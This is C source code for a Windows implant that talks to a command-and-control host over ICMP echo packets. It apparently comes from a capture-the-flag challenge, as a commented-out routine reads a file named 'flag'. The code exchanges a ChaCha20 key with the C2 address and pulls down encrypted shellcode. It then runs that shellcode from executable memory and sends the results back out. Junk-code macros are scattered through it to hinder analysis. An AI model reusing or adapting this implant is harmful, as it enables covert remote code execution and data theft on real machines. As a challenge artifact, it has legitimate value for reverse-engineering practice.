#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "chacha20.h"
#include <string.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <iphlpapi.h>
#include <IcmpAPI.h>

#define C2_ADDR "192.168.146.130"
#define FRAGMENT_SZ 0x500
#include "trash.h"


void dead_code(char *aaa)
{
    LoadLibraryA(aaa);
}
void dead()
{
    void* a = CreateFileA;
    void* b = ReadFileEx;
}

void get_rand_bytes(char *out, int sz)
{
	TRASH;
	for (int i = 0; i != sz; ++i)
		out[i] = rand() & 0xFF;
}

int icmp_payload(char cmd, int payload_sz, char *payload, char *out)
{
	out[0] = cmd;
	TRASH;
	*((int*)(&out[1])) = payload_sz;
	memcpy(out + 5, payload, payload_sz);
	return 1 + 4 + payload_sz;
}

int icmp_enc_payload(char *nonce, char *key, char cmd, char *in, int in_sz, char *out)
{
	out[0] = cmd;
	*((int*)(&out[1])) = in_sz;
	TRASH;
	char *ct = malloc(in_sz);
	ChaCha20XOR(key, 0, nonce, in, ct, in_sz);
	TRASH;
	memcpy(out + 5, ct, in_sz);
	free(ct);
	return 5 + in_sz;
}

int send_c2_pkt(char *nonce, char *key, char *in, int in_sz, char *out)
{
	TRASH;
    HANDLE icmp_handle = IcmpCreateFile();
    if (icmp_handle == INVALID_HANDLE_VALUE) {
        return -1;
    }

    IN_ADDR dest_ip;
    dest_ip.S_un.S_addr = inet_addr(C2_ADDR);
    if (dest_ip.S_un.S_addr == INADDR_NONE) {
        return -1;
    }
	TRASH;
    int reply_buf_size = sizeof(ICMP_ECHO_REPLY) + in_sz + 8;
    char *reply_buf = malloc(reply_buf_size);

    // Make the echo request.
    DWORD reply_count = IcmpSendEcho(icmp_handle, dest_ip.S_un.S_addr,
        in, in_sz, NULL, reply_buf, reply_buf_size, 10000);

    // Return value of 0 indicates failure, try to get error info.
    if (reply_count == 0) {
        free(reply_buf);
        return -1;
    }
	TRASH;
    const ICMP_ECHO_REPLY *r = (const ICMP_ECHO_REPLY *) reply_buf;
    int ret_sz = r->DataSize;
	
	ChaCha20XOR(key, 0, nonce, r->Data, out, r->DataSize);
    free(reply_buf);
    IcmpCloseHandle(icmp_handle);
	TRASH;
    return ret_sz;
}
/*
#include "GetProcAddressWithHash.h"
#define BUFFERSIZE 50
void get_flag(char *ReadBuffer)
{
    HANDLE hFile; 
    DWORD  dwBytesRead = 0;
    OVERLAPPED ol = {0};
    char flagstr[] = "flag";

    HANDLE (*CreateFileA_) (LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE) = GetProcAddressWithHashInIAT(CreateFileA_HASH);

    hFile = CreateFileA_(flagstr,               // file to open
                       GENERIC_READ,          // open for reading
                       FILE_SHARE_READ,       // share for reading
                       NULL,                  // default security
                       OPEN_EXISTING,         // existing file only
                       FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, // normal file
                       NULL);                 // no attr. template

    // Read one character less than the buffer size to save room for
    // the terminating NULL character. 

    BOOL (*ReadFileEx_)(HANDLE, LPVOID, DWORD, LPOVERLAPPED, LPOVERLAPPED_COMPLETION_ROUTINE) = GetProcAddressWithHashInIAT(ReadFileEx_HASH);
    ReadFileEx_(hFile, ReadBuffer, BUFFERSIZE-1, &ol, NULL);
    
}
*/

int main()
{
	
	char buf [0x1000];
	char obuf[0x1000];
	int pkt_sz = 0;
	char nonce_n_key[12 + 32];
	char exec_ret[50];
	char cmd[0x500] = {0};
	TRASH;
	strcpy(cmd, "fetch cmd");

	// step 1
    srand(time(NULL));
	get_rand_bytes(nonce_n_key     , 12);
	TRASH;
	get_rand_bytes(nonce_n_key + 12, 32);
	pkt_sz = icmp_payload(1, sizeof(nonce_n_key), nonce_n_key, buf);
	if ( !(send_c2_pkt(nonce_n_key, nonce_n_key + 12, buf, pkt_sz, obuf) == 2 && obuf[0] == 'O' && obuf[1] == 'K') )
	{
		puts("error");
		return -1;
	}
	
	
	// step 2
	void (*shellcode)(void*) = VirtualAlloc(NULL, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memset(shellcode, 0x90, 0x1000);
	memset(exec_ret, 0, sizeof(exec_ret));
	TRASH;
	
	pkt_sz = icmp_enc_payload(nonce_n_key, nonce_n_key + 12, 2, cmd, sizeof(cmd), buf);
	if (send_c2_pkt(nonce_n_key, nonce_n_key + 12, buf, pkt_sz, shellcode) == -1)
	{
		puts("error");
		return -1;
	}
	TRASH;
	shellcode(exec_ret);
	//get_flag(exec_ret);
	pkt_sz = icmp_enc_payload(nonce_n_key, nonce_n_key + 12, 3, exec_ret, sizeof(exec_ret), buf);
	TRASH;
	if ( !(send_c2_pkt(nonce_n_key, nonce_n_key + 12, buf, pkt_sz, obuf) == 2 && obuf[0] == 'O' && obuf[1] == 'K') )
	{
		puts("error");
		return -1;
	}
	puts("execute done");
}